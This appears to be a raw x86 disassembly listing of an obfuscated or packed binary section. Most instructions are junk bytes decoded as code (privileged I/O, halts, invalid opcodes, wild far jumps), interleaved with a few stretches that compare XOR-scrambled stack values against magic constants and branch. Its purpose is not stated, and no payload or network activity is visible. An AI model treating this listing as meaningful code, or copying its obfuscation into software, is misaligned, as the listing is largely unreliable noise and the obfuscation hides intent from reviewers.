  401908:	lods   al,BYTE PTR ds:[esi]
  401909:	lahf   
  40190a:	mov    dl,0x9f
  40190c:	scas   eax,DWORD PTR es:[edi]
  40190d:	ret    
  40190e:	mov    dl,BYTE PTR [edx-0x34b3283]
  401914:	push   es
  401915:	and    DWORD PTR [edx+0x51dea7b7],esp
  40191b:	mov    BYTE PTR [edi],al
  40191d:	and    edi,DWORD PTR [edx-0x40e5d10f]
  401923:	push   esp
  401924:	ds jnp 0x401971
  401927:	jp     0x401945
  401929:	jl     0x401947
  40192b:	xchg   edx,eax
  40192c:	jge    0x4018ba
  40192e:	jp     0x4018f1
  401930:	and    edx,0x45
  401933:	mov    ds:0xcb44ee22,eax
  401938:	rcl    BYTE PTR [esp+ebx*8+0x1f],cl
  40193c:	(bad)  
  40193d:	out    dx,al
  40193e:	hlt    
  40193f:	pop    edx
  401940:	pop    edx
  401941:	in     eax,dx
  401942:	lods   eax,DWORD PTR ds:[esi]
  401943:	call   0x9472a44e
  401948:	push   edx
  401949:	and    dh,BYTE PTR [eax]
  40194b:	mov    DWORD PTR ds:[ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xf87bf628
  401994:	mov    ebx,0x7a705963
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	pop    esp
  4019a0:	fist   WORD PTR [ebp-0x3f]
  4019a3:	xchg   edx,eax
  4019a4:	daa    
  4019a5:	inc    eax
  4019a6:	cmp    eax,0x41d6c729
  4019ab:	adc    eax,0x2e31433c
  4019b0:	scas   eax,DWORD PTR es:[edi]
  4019b1:	outs   dx,BYTE PTR ds:[esi]
  4019b2:	mov    eax,0xfa54c5c4
  4019b7:	out    0x7d,eax
  4019b9:	iret   
  4019ba:	xchg   edi,eax
  4019bb:	dec    esi
  4019bc:	repz inc esi
  4019be:	arpl   WORD PTR [ebp+0x79],dx
  4019c1:	jl     0x2a27c547
  4019c7:	(bad)  
  4019c8:	fucomp st(1)
  4019ca:	lods   eax,DWORD PTR ds:[esi]
  4019cb:	cmp    al,0xf2
  4019cd:	jno    0x4019c4
  4019cf:	out    0x37,eax
  4019d1:	mov    ecx,0xcfd0bcb3
  4019d6:	(bad)  
  4019d7:	out    0x11,al
  4019d9:	cs test eax,ecx
  4019dc:	mov    BYTE PTR [eax],0xc1
  4019df:	int    0x58
  4019e1:	retf   
  4019e2:	xchg   edx,eax
  4019e3:	fdivr  st(3),st
  4019e5:	push   cs
  4019e6:	hlt    
  4019e7:	pop    ss
  4019e8:	cmp    eax,0xc6ff58e9
  4019ed:	gs daa 
  4019ef:	bound  esp,QWORD PTR [edi]
  4019f1:	ja     0x401a63
  4019f3:	imul   edi,edi,0x73
  4019f6:	add    eax,0x5731a118
  4019fb:	jb     0x401a05
  4019fd:	mov    eax,0x642c85cc
  401a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a03:	and    DWORD PTR [ebp-0x232e3e09],0xffffffae
  401a0a:	push   eax
  401a0b:	dec    ecx
  401a0c:	cmc    
  401a0d:	add    al,0x42
  401a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a10:	mov    ebp,DWORD PTR [ebp+0x6e070ddb]
  401a16:	icebp  
  401a17:	and    DWORD PTR [edx+ebp*8],edx
  401a1a:	xor    DWORD PTR [edx],edi
  401a1c:	aad    0x7a
  401a1e:	push   ss
  401a1f:	jmp    0x6c16:0xdb084cc0
  401a26:	fdivr  DWORD PTR [eax+0x793b44cf]
  401a2c:	push   ecx
  401a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a2e:	add    eax,0x7f95c23a
  401a33:	xchg   ecx,eax
  401a34:	(bad)  
  401a36:	popf   
  401a37:	xchg   DWORD PTR [esi],edx
  401a39:	xchg   edx,eax
  401a3a:	or     BYTE PTR [ebp+0x5ab23edb],0xfe
  401a41:	add    al,0xd7
  401a43:	popf   
  401a44:	or     ch,BYTE PTR [ebp-0x4b9ccc14]
  401a4a:	push   esp
  401a4b:	repz or BYTE PTR [eax],dl
  401a4e:	call   0xf7d0:0xe7232d29
  401a55:	pop    esi
  401a56:	jae    0x401acf
  401a58:	push   ss
  401a59:	mov    cl,0x28
  401a5b:	mov    ebx,0xc455cd53
  401a60:	dec    edx
  401a61:	add    BYTE PTR [edx+0x32],dh
  401a64:	and    eax,0x3118d3f0
  401a69:	mov    edi,0x5ca27f62
  401a6e:	in     al,0x43
  401a70:	xchg   edx,eax
  401a71:	inc    eax
  401a72:	mov    bl,0xaa
  401a74:	imul   esi,ebx,0x8780f28b
  401a7a:	dec    ebp
  401a7b:	sti    
  401a7c:	lods   eax,DWORD PTR ds:[esi]
  401a7d:	loopne 0x401a32
  401a7f:	fnstenv [edi+0x763a846f]
  401a85:	sbb    edx,edi
  401a87:	xchg   esi,eax
  401a88:	mov    bh,0xde
  401a8a:	xor    DWORD PTR [ecx],eax
  401a8c:	jle    0x401b08
  401a8e:	lods   eax,DWORD PTR ds:[esi]
  401a8f:	test   BYTE PTR [ecx-0x936d997],bh
  401a95:	bound  esp,QWORD PTR [eax]
  401a97:	ins    BYTE PTR es:[edi],dx
  401a98:	mov    dh,0x75
  401a9a:	stos   DWORD PTR es:[edi],eax
  401a9b:	jmp    0xadc3a355
  401aa0:	pop    ebp
  401aa1:	mov    ds:0x91bdc738,al
  401aa6:	xchg   BYTE PTR [esi-0x5337ef64],bh
  401aac:	or     BYTE PTR [eax-0x4f625ed8],0xab
  401ab3:	out    dx,al
  401ab4:	lods   al,BYTE PTR ds:[esi]
  401ab5:	std    
  401ab6:	jnp    0x401ab4
  401ab8:	call   0xd2614b6f
  401abd:	mov    ah,ah
  401abf:	inc    ecx
  401ac0:	js     0x401a67
  401ac2:	jne    0x401a5d
  401ac4:	fsub   QWORD PTR [ebp+0x46]
  401ac7:	ror    DWORD PTR [ebx+0xd],1
  401aca:	ins    DWORD PTR es:[edi],dx
  401acb:	sbb    DWORD PTR [edi],eax
  401acd:	sar    eax,cl
  401acf:	neg    DWORD PTR [ebp+edx*1+0x79562932]
  401ad6:	fsubr  QWORD PTR [eax-0x1a]
  401ad9:	mov    eax,0xdba7a05
  401ade:	ss add al,0xce
  401ae1:	lods   eax,DWORD PTR ds:[esi]
  401ae2:	ins    DWORD PTR es:[edi],dx
  401ae3:	add    DWORD PTR [esi-0x5f],eax
  401ae6:	cs in  eax,0x68
  401ae9:	xor    ecx,esp
  401aeb:	fst    st(1)
  401aed:	add    al,0x67
  401aef:	in     al,0x17
  401af1:	add    dl,BYTE PTR [esi-0x5d]
  401af4:	(bad)  
  401af5:	in     al,dx
  401af6:	xchg   DWORD PTR [edi],esp
  401af8:	mov    ebp,0xbad13b3c
  401afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401afe:	sbb    dl,al
  401b00:	in     al,0x56
  401b02:	repnz add DWORD PTR [eax-0x7],ebp
  401b06:	xor    al,BYTE PTR [edx-0x2f401d81]
  401b0c:	cs mov ah,0x94
  401b0f:	push   eax
  401b10:	sar    ebx,cl
  401b12:	daa    
  401b13:	fimul  DWORD PTR [ebp+0x7bce5f85]
  401b19:	push   cs
  401b1a:	imul   ebp,DWORD PTR [ebp+0x7e3bb3f2],0xffffffc0
  401b21:	repz in eax,0x79
  401b24:	dec    bx
  401b26:	push   esp
  401b27:	adc    ecx,ecx
  401b29:	das    
  401b2a:	hlt    
  401b2b:	mov    WORD PTR gs:[esi],?
  401b2e:	sbb    BYTE PTR [ebx],ch
  401b30:	pop    ds
  401b31:	or     eax,0x64b53dc7
  401b36:	dec    esi
  401b37:	and    al,0x98
  401b39:	mov    esp,gs
  401b3b:	jmp    0x68db8c4e
  401b40:	inc    eax
  401b42:	mov    edi,0xc69c78b9
  401b47:	xor    DWORD PTR [esi],edi
  401b49:	xor    ebp,ebp
  401b4b:	xchg   esp,eax
  401b4c:	push   edx
  401b4d:	cli    
  401b4e:	daa    
  401b4f:	cmc    
  401b50:	dec    ecx
  401b51:	mov    ebp,?
  401b53:	std    
  401b54:	and    BYTE PTR [eax+ecx*8-0x38],0xae
  401b59:	pop    esp
  401b5a:	jl     0x401bcb
  401b5c:	fdivr  QWORD PTR [edx+0x59]
  401b5f:	retf   
  401b60:	cvtps2pi mm1,QWORD PTR [edx]
  401b63:	and    edi,0xe3214204
  401b69:	jo     0x401be9
  401b6b:	les    edx,FWORD PTR [eax]
  401b6d:	pop    esi
  401b6e:	out    dx,al
  401b6f:	cmp    DWORD PTR ds:0x2d93dbd6,ecx
  401b75:	mov    eax,edx
  401b77:	pop    ss
  401b78:	adc    bh,al
  401b7a:	push   DWORD PTR [ebp-0x9d62b32]
  401b80:	call   0xf71d780f
  401b85:	sub    eax,0x167f594b
  401b8a:	lahf   
  401b8b:	enter  0x5605,0x99
  401b8f:	sub    edi,eax
  401b91:	fdivr  QWORD PTR [esi+0x54]
  401b94:	xor    al,0x74
  401b96:	cmp    al,0x11
  401b98:	mov    ah,0x8b
  401b9a:	sahf   
  401b9b:	inc    ebp
  401b9c:	mov    bh,0x4b
  401b9e:	clc    
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    ch,BYTE PTR [ebx-0x33]
  401bde:	std    
  401bdf:	retf   
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	sbb    DWORD PTR [edi],edx
  401bea:	jge    0x401bfd
  401bec:	xor    BYTE PTR [ebp+0x1d],0xbf
  401bf0:	sbb    edx,0x10469a5e
  401bf6:	and    al,0xb7
  401bf8:	dec    ecx
  401bf9:	xchg   esp,eax
  401bfa:	pop    eax
  401bfb:	fdiv   DWORD PTR [edi-0x16]
  401bfe:	shl    DWORD PTR ds:0x75a78985,cl
  401c04:	push   ss
  401c05:	or     BYTE PTR [esi-0x504a1a29],al
  401c0b:	push   cs
  401c0c:	mov    ds:0x866d2f48,al
  401c11:	sub    DWORD PTR [esi+eax*4+0x35],ebx
  401c15:	sbb    DWORD PTR [esi+ebx*8+0x19],0xeb682dbe
  401c1d:	(bad)  
  401c1e:	cli    
  401c1f:	(bad)  
  401c21:	(bad)  
  401c22:	mov    eax,ds:0x9b333e57
  401c27:	sahf   
  401c28:	push   0xffffff93
  401c2a:	cmp    DWORD PTR [edi+0x21],0xfffffff3
  401c2e:	push   edi
  401c2f:	cdq    
  401c30:	sbb    al,0xc5
  401c32:	(bad)  
  401c33:	out    dx,eax
  401c34:	mov    ds:0xef9ecd24,al
  401c39:	cmp    al,0xf1
  401c3b:	stc    
  401c3c:	imul   BYTE PTR [eax]
  401c3e:	xor    BYTE PTR ds:0x485d64c3,dl
  401c44:	fld    QWORD PTR [ecx+0x5]
  401c47:	add    al,0x62
  401c49:	jbe    0x401cbf
  401c4b:	aam    0x63
  401c4d:	mov    al,ds:0x716607a2
  401c52:	in     al,0x2c
  401c54:	popf   
  401c55:	xchg   BYTE PTR [edi-0x7d],dl
  401c58:	add    eax,0xb57df7a3
  401c5d:	or     ah,ah
  401c5f:	mov    ah,0x16
  401c61:	push   esi
  401c62:	xchg   dh,ch
  401c64:	dec    ebp
  401c65:	lods   eax,DWORD PTR ds:[esi]
  401c66:	mov    eax,ds:0xa977a98b
  401c6b:	pop    ds
  401c6c:	popa   
  401c6d:	aaa    
  401c6e:	(bad)  
  401c6f:	xor    edx,DWORD PTR ds:0xa5ed8db2
  401c75:	dec    edi
  401c76:	cwde   
  401c77:	mov    dh,0xde
  401c79:	xchg   al,bl
  401c7b:	sub    al,0xbc
  401c7d:	sar    BYTE PTR [eax-0x27],0x7a
  401c81:	popa   
  401c82:	push   edi
  401c83:	xchg   ebx,eax
  401c84:	xor    al,0x50
  401c86:	sub    ebp,esi
  401c88:	sub    al,0xde
  401c8a:	mov    ecx,0x92e78447
  401c8f:	out    dx,al
  401c90:	mov    edi,0x3642cd9d
  401c95:	cld    
  401c96:	cli    
  401c97:	rcr    DWORD PTR [ebp+0x13],0xd1
  401c9b:	repz add eax,0xbcb5724
  401ca1:	jmp    0x401cb7
  401ca3:	pop    esi
  401ca4:	je     0x401cd8
  401ca6:	mov    ch,0x97
  401ca8:	fdivr  QWORD PTR [ebx]
  401caa:	stc    
  401cab:	jnp    0x401c9f
  401cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401cae:	mov    al,0x4e
  401cb0:	mov    dh,0xe0
  401cb2:	out    0xe6,al
  401cb4:	pop    eax
  401cb5:	push   edx
  401cb6:	or     edx,edi
  401cb8:	lock jmp 0x86e1:0xa5bf08f9
  401cc0:	sti    
  401cc1:	dec    edi
  401cc2:	adc    eax,ecx
  401cc4:	(bad)  
  401cc5:	push   0x15cf83ec
  401cca:	jo     0x401c90
  401ccc:	js     0x401c94
  401cce:	push   es
  401ccf:	test   BYTE PTR [esi+0x7974d8d7],ah
  401cd5:	cdq    
  401cd6:	cli    
  401cd7:	mov    al,ds:0x9ba1cfe0
  401cdc:	mov    ds:0x138cf35f,eax
  401ce1:	ds mov cl,0xd5
  401ce4:	xor    DWORD PTR [ebx],esp
  401ce6:	inc    esi
  401ce7:	mov    ebx,DWORD PTR [edx-0x71df6301]
  401ced:	call   0x33a3:0x81669266
  401cf4:	and    dh,BYTE PTR [edx+eiz*4+0x6c]
  401cf8:	in     eax,dx
  401cf9:	dec    esp
  401cfa:	(bad)  [esi-0x59]
  401cfd:	scas   eax,DWORD PTR es:[edi]
  401cfe:	das    
  401cff:	xor    BYTE PTR [esi+edx*4-0x78],bh
  401d03:	lea    eax,[edi+0x6c9ec505]
  401d09:	dec    eax
  401d0a:	xchg   esp,eax
  401d0b:	pop    edx
  401d0c:	leave  
  401d0d:	xchg   esp,eax
  401d0e:	shr    BYTE PTR [eax+0x728955b5],0x24
  401d15:	test   al,0x5f
  401d17:	xchg   ebx,eax
  401d18:	dec    edi
  401d19:	ss mov edx,0x31ac71c0
  401d1f:	iret   
  401d20:	dec    edi
  401d21:	int    0xf9
  401d23:	lods   eax,DWORD PTR ds:[esi]
  401d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d25:	dec    ecx
  401d26:	mov    eax,0xac4ca1d7
  401d2b:	pop    ss
  401d2c:	push   ebp
  401d2d:	adc    DWORD PTR [edx],0xffffffad
  401d30:	mov    cl,0xb
  401d32:	mov    ds:0x49761760,al
  401d37:	cli    
  401d38:	mov    esi,0xe6be6953
  401d3d:	add    BYTE PTR [edx],bl
  401d3f:	enter  0xd6f,0x76
  401d43:	and    eax,0x7f21ab18
  401d48:	aad    0xa4
  401d4a:	inc    ebx
  401d4b:	sub    bh,BYTE PTR [ebx-0x6bc607a1]
  401d51:	cmc    
  401d52:	(bad)
  401d57:	push   ebp
  401d58:	clc    
  401d59:	and    DWORD PTR [esi-0x5d39ebd7],ebx
  401d5f:	jno    0x401d3f
  401d61:	sbb    ecx,DWORD PTR [ecx-0x11e7a027]
  401d67:	sub    eax,0x7a3a73e3
  401d6c:	imul   DWORD PTR [ecx+ebx*2-0x4f]
  401d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d71:	pusha  
  401d72:	push   eax
  401d73:	mov    esi,0xec219512
  401d78:	push   es
  401d79:	std    
  401d7a:	pop    edi
  401d7b:	pop    esp
  401d7c:	mov    dh,0x63
  401d7e:	mov    esp,0xeebe3ad4
  401d83:	scas   eax,DWORD PTR es:[edi]
  401d84:	arpl   WORD PTR [edx+0x4b],si
  401d87:	and    esp,edx
  401d89:	cmp    eax,DWORD PTR [esi+0x14]
  401d8c:	ret    0x962a
  401d8f:	pop    ecx
  401d90:	cmp    al,0xcb
  401d92:	push   0xd7dbffb9
  401d97:	or     eax,0x3eaec11d
  401d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d9d:	imul   ebp,esp,0x49
  401da0:	repz sub ebp,ebx
  401da3:	mov    BYTE PTR [esi],bh
  401da5:	sbb    DWORD PTR [ebx],ebx
  401da7:	call   0xbb4450c9
  401dac:	sbb    BYTE PTR [edi-0x3b],dl
  401daf:	(bad)  
  401db0:	out    0x45,al
  401db2:	adc    dl,bh
  401db4:	mov    eax,ds:0xd09202a5
  401db9:	or     DWORD PTR [ebx-0x5e218f4a],esi
  401dbf:	sub    eax,0xed9ca620
  401dc4:	pop    edx
  401dc5:	mov    ah,0xa3
  401dc7:	fcomp  QWORD PTR [eax]
  401dc9:	mul    esi
  401dcb:	pop    edx
  401dcc:	outs   dx,DWORD PTR ds:[esi]
  401dcd:	or     dl,BYTE PTR [esi]
  401dcf:	mov    bh,0x51
  401dd1:	add    esi,0x8b12cd5e
  401dd7:	cmc    
  401dd8:	jg     0x401e41
  401dda:	lock mov WORD PTR [edx],fs
  401ddd:	idiv   BYTE PTR [ebp-0xb]
  401de0:	clc    
  401de1:	jmp    0xc81b:0xfc2d2544
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebx+ebx*4-0x50],dl
  401e44:	mov    eax,0x700670af
  401e49:	jo     0x401ebb
  401e4b:	jle    0x401ebd
  401e4d:	jo     0x401dd6
  401e4f:	add    eax,0x178abcab
  401e54:	outs   dx,BYTE PTR ds:[esi]
  401e55:	push   ecx
  401e56:	push   esi
  401e57:	xor    eax,ebp
  401e59:	aaa    
  401e5a:	gs dec eax
  401e5c:	imul   DWORD PTR [ecx]
  401e5e:	mov    dl,0x4e
  401e60:	mov    ecx,0x9d4bac95
  401e65:	push   0xcd67a70f
  401e6a:	jp     0x401e99
  401e6c:	pop    eax
  401e6d:	push   ds
  401e6e:	sub    DWORD PTR [eax+0x4b],0x37d3e188
  401e75:	fchs   
  401e77:	std    
  401e78:	lods   eax,DWORD PTR ds:[esi]
  401e79:	adc    eax,0xaeb48300
  401e7e:	retf   
  401e7f:	sbb    al,0x38
  401e81:	pop    ecx
  401e82:	aaa    
  401e83:	loop   0x401e52
  401e85:	push   es
  401e86:	sub    ebp,DWORD PTR [ecx]
  401e88:	enter  0x681,0x84
  401e8c:	sbb    ecx,DWORD PTR [esi-0x67]
  401e8f:	enter  0xbdec,0x44
  401e93:	aad    0xbf
  401e95:	pop    esp
  401e96:	cmp    BYTE PTR [esi],0xa8
  401e99:	retf   0xf924
  401e9c:	inc    esp
  401e9d:	(bad)  [edx-0x528f2e97]
  401ea3:	cdq    
  401ea4:	daa    
  401ea5:	scas   eax,DWORD PTR es:[edi]
  401ea6:	mov    dh,bl
  401ea8:	push   ebx
  401ea9:	out    0xc9,al
  401eab:	call   0x1dd1cf17
  401eb0:	repnz in eax,dx
  401eb2:	mov    al,0x9f
  401eb4:	pop    edx
  401eb5:	call   0x6890:0x438665d6
  401ebc:	cmp    al,0xe5
  401ebe:	inc    edi
  401ebf:	loopne 0x401f40
  401ec1:	push   es
  401ec2:	lahf   
  401ec3:	sbb    DWORD PTR [edx+0x78b4ddd8],edx
  401ec9:	das    
  401eca:	rol    BYTE PTR [ecx],1
  401ecc:	push   edx
  401ecd:	fwait
  401ece:	xchg   edx,eax
  401ecf:	fnstsw WORD PTR [ebx+0x51addb65]
  401ed5:	push   cs
  401ed6:	test   esi,0x488e7f56
  401edc:	(bad)  
  401edd:	jmp    0x61ce6c2
  401ee2:	mov    di,0x83b2
  401ee6:	mov    ds:0x409887a6,eax
  401eeb:	cmp    eax,0x7632a25e
  401ef0:	(bad)  
  401ef1:	in     al,dx
  401ef2:	(bad)  [edx-0x62]
  401ef5:	xchg   DWORD PTR [ebp+0x3a],ebp
  401ef8:	mov    eax,cs:0xa95e73af
  401efe:	cdq    
  401eff:	aad    0x5
  401f01:	xchg   ebp,eax
  401f02:	push   ss
  401f03:	ds pop esp
  401f05:	loope  0x401f4a
  401f07:	fdivrp st(2),st
  401f09:	mov    BYTE PTR [ebx],dh
  401f0b:	inc    esi
  401f0c:	int    0xeb
  401f0e:	repnz test BYTE PTR [ebx+0x4],bh
  401f12:	pusha  
  401f13:	inc    ecx
  401f14:	xchg   esp,eax
  401f15:	mov    ecx,0x8f554046
  401f1a:	mov    bl,0xdc
  401f1c:	push   ds
  401f1d:	dec    edi
  401f1e:	je     0x401ea9
  401f20:	and    eax,0x6b84ed70
  401f25:	hlt    
  401f26:	out    dx,al
  401f27:	cmp    DWORD PTR [esi],eax
  401f29:	(bad)  
  401f2a:	addr16 ds (bad) 
  401f2d:	shl    BYTE PTR [eax+0x522f5c41],cl
  401f33:	mov    es,WORD PTR ss:[ebx+0x6d]
  401f37:	mov    ds,WORD PTR [edx]
  401f39:	pop    ds
  401f3a:	mov    eax,0xfcb5aafe
  401f3f:	inc    ebx
  401f40:	adc    eax,0x68b3927b
  401f45:	mov    dl,0x3a
  401f47:	mov    eax,ds:0x652d0513
  401f4c:	pop    edx
  401f4d:	mov    ebx,eax
  401f4f:	pop    ecx
  401f50:	add    bh,BYTE PTR [ecx+0x29]
  401f53:	pop    DWORD PTR [edx-0x57]
  401f56:	or     DWORD PTR [edi+ebx*8],eax
  401f59:	jmp    DWORD PTR [ebx+0x22d4b678]
  401f5f:	mov    WORD PTR [eax],?
  401f61:	mov    ch,0xc1
  401f63:	mov    al,ds:0x53452b9a
  401f68:	call   0xd7c4:0xd6097182
  401f6f:	sub    esi,DWORD PTR [ebx]
  401f71:	and    eax,0x6f9c798
  401f76:	push   ecx
  401f77:	jmp    0x401f46
  401f79:	or     BYTE PTR [esi-0x9],ch
  401f7c:	or     ebp,DWORD PTR ds:0x497c02da
  401f82:	xor    al,0x68
  401f84:	push   eax
  401f85:	(bad)  
  401f86:	loopne 0x401f55
  401f88:	cmp    DWORD PTR [ebp-0x61],0xffffff96
  401f8c:	daa    
  401f8d:	stc    
  401f8e:	mov    eax,0xadae06cc
  401f93:	es enter 0x32a8,0xbe
  401f98:	sbb    DWORD PTR [ebp-0x5],0xffffffd4
  401f9c:	test   eax,0xdb5e0745
  401fa1:	es mov cs,ebx
  401fa4:	lock add al,0x4f
  401fa7:	rcr    bl,0x7
  401faa:	jmp    0x38b30169
  401faf:	push   ebp
  401fb0:	dec    esp
  401fb1:	push   0xd34e5846
  401fb6:	scas   al,BYTE PTR es:[edi]
  401fb7:	idiv   DWORD PTR [eax-0x6aa23ef1]
  401fbd:	add    DWORD PTR ds:0xd99d9177,edi
  401fc3:	xor    al,0x64
  401fc5:	push   ds
  401fc6:	enter  0x8b4c,0x99
  401fca:	sub    cl,BYTE PTR [ebx-0x48e76651]
  401fd0:	mov    ds:0xed3fd923,eax
  401fd5:	push   edi
  401fd6:	mov    dh,0xfc
  401fd8:	push   ds
  401fd9:	dec    esi
  401fda:	xor    cl,BYTE PTR [eax]
  401fdc:	xchg   BYTE PTR [edi],dh
  401fde:	not    BYTE PTR [edx-0x5c33bd3b]
  401fe4:	fcom   DWORD PTR [ebx-0x4af7e9e0]
  401fea:	dec    ecx
  401feb:	in     al,0x94
  401fed:	imul   edi,DWORD PTR [eax+0x62a8dbd],0x1c
  401ff4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff5:	and    DWORD PTR [eax+0x24bb1919],ecx
  401ffb:	dec    eax
  401ffc:	xchg   ecx,eax
  401ffd:	jmp    0x7e568bd5
  402002:	mov    bl,cl
  402004:	(bad)  
  402006:	pop    esp
  402007:	in     eax,dx
  402008:	loop   0x401f94
  40200a:	dec    esp
  40200b:	mov    BYTE PTR [ebx],dh
  40200d:	ret    0x548f
  402010:	pmaxsw mm7,QWORD PTR [ebp+0x68]
  402014:	lock test BYTE PTR [edx+0x5c],cl
  402018:	mov    dh,0x97
  40201a:	imul   esp,DWORD PTR [esi-0x53],0xe3db2e7
  402021:	leave  
  402022:	lea    ebp,[eax+ecx*8+0x63]
  402026:	cdq    
  402027:	scas   al,BYTE PTR es:[edi]
  402028:	loop   0x402046
  40202a:	push   ds
  40202b:	sti    
  40202c:	sbb    esp,DWORD PTR [esp+ecx*2-0x60]
  402030:	pusha  
  402031:	test   al,0x90
  402033:	xchg   esi,eax
  402034:	dec    edi
  402035:	mov    al,0x94
  402037:	fadd   st,st(6)
  402039:	lock inc ebx
  40203b:	adc    esp,DWORD PTR [edi]
  40203d:	dec    ebp
  40203e:	dec    ebx
  40203f:	ret    0xd3d6
  402042:	(bad)  
  402043:	xor    edx,DWORD PTR [edx+0x7592148f]
  402049:	stos   DWORD PTR es:[edi],eax
  40204a:	retf   0xd089
  40204d:	jmp    0x401fda
  40204f:	push   ebp
  402050:	fmul   DWORD PTR [ebx-0x38fc99ee]
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	cmp    bl,0x48
  40206c:	(bad)  
  40206d:	pop    esi
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	inc    edx
  402077:	pop    edi
  402078:	pusha  
  402079:	lea    ebx,[esi-0x64f2c67c]
  40207f:	test   eax,0xfb373b5a
  402084:	fwait
  402085:	and    DWORD PTR [edi],ebp
  402087:	rep lods eax,DWORD PTR ds:[esi]
  402089:	jne    0x4020af
  40208b:	fcmovnbe st,st(6)
  40208d:	(bad)  [edx-0xd6aa819]
  402093:	xchg   ebp,eax
  402094:	imul   ebx,DWORD PTR [eax+ebx*2-0x7bb9c0f4],0x9aa840ae
  40209f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a0:	pop    edx
  4020a1:	push   esi
  4020a2:	or     BYTE PTR [edi-0x8],dh
  4020a5:	cs pop edi
  4020a7:	es mov dh,0x83
  4020aa:	stc    
  4020ab:	push   ss
  4020ac:	mov    dh,0xb2
  4020ae:	cmp    BYTE PTR [edi+eiz*2],bh
  4020b1:	adc    esp,DWORD PTR [edx+0x57]
  4020b4:	sbb    cl,BYTE PTR [ecx-0x15]
  4020b7:	fldcw  WORD PTR [ebx]
  4020b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020ba:	stos   DWORD PTR es:[edi],eax
  4020bb:	lods   al,BYTE PTR ds:[esi]
  4020bc:	call   0xcbaa:0xb72daecd
  4020c3:	xor    dh,BYTE PTR [esi]
  4020c5:	out    0xb,al
  4020c7:	retf   0x859d
  4020ca:	cdq    
  4020cb:	pop    ebx
  4020cc:	jnp    0x402133
  4020ce:	and    eax,0xb6bfb85
  4020d3:	aas    
  4020d4:	xor    dh,BYTE PTR [edx+0x32]
  4020d7:	lahf   
  4020d8:	push   0xffffffd7
  4020da:	xchg   esp,eax
  4020db:	test   al,0x90
  4020dd:	in     eax,0xfb
  4020df:	mov    ecx,0x1d34011f
  4020e4:	lahf   
  4020e5:	xchg   edx,eax
  4020e6:	dec    ecx
  4020e7:	jo     0x402128
  4020e9:	dec    ebx
  4020ea:	sahf   
  4020eb:	pop    ss
  4020ec:	imul   ecx,DWORD PTR [edx+0x65582514],0x48709b36
  4020f6:	int3   
  4020f7:	jo     0x402097
  4020f9:	mov    dh,0xc0
  4020fb:	mov    ah,0xce
  4020fd:	es gs inc edi
  402100:	je     0x402087
  402102:	mov    al,gs:0x78dbccdb
  402108:	xor    DWORD PTR [eax],ebp
